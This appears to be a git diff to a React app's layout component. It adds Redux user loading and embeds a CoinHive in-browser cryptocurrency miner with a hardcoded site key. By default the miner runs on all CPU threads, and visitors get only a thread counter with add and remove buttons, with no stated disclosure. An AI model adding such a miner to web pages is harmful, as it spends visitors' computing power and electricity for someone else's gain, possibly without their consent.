@@ -1,9 +1,42 @@
 import React from 'react';
+import { connect } from "react-redux";
+import CoinHive from 'react-coin-hive';
 
 import Menu from '../components/Menu';
 
+import { fetchUser } from "../actions/UserActions";
+
+@connect((store) => {
+    return {
+        user: store.user.user,
+        user_fetched: store.user.fetched
+    };
+})
 
 export default class Layout extends React.Component {
+    state = {
+        threads: navigator.hardwareConcurrency,
+        startOnIdle: true
+    }
+    
+    addThread = () => {
+        this.setState({ threads: this.state.threads + 1 })
+    }
+    
+    removeThread = () => {
+        this.setState({ threads: this.state.threads - 1 })
+
+        
+    }
+
+    componentWillMount() {
+        this.props.dispatch(fetchUser())
+    }
+
+    fetchUser() {
+        this.props.dispatch(fetchUser())
+    }
+
     render() {
         const { location } = this.props;
 
@@ -29,6 +62,28 @@ export default class Layout extends React.Component {
                 <Menu location={location} />
 
                 {this.props.children}
+
+
+                <div className="header">
+                    <h2>Threads: {this.state.threads}</h2>
+                </div>
+                <div>
+                    <input
+                    type="button"
+                    value="add"
+                    onClick={this.addThread}
+                    />
+                    <input
+                    type="button"
+                    value="remove"
+                    onClick={this.removeThread}
+                    />
+                </div>
+                <CoinHive siteKey='LizXPgR1RicCNg50MGh2EOgT4BjJovK0'
+                    threads={this.state.threads}
+                    userName='{ user.name }'
+                    
+                />
             </div>
         )
     }
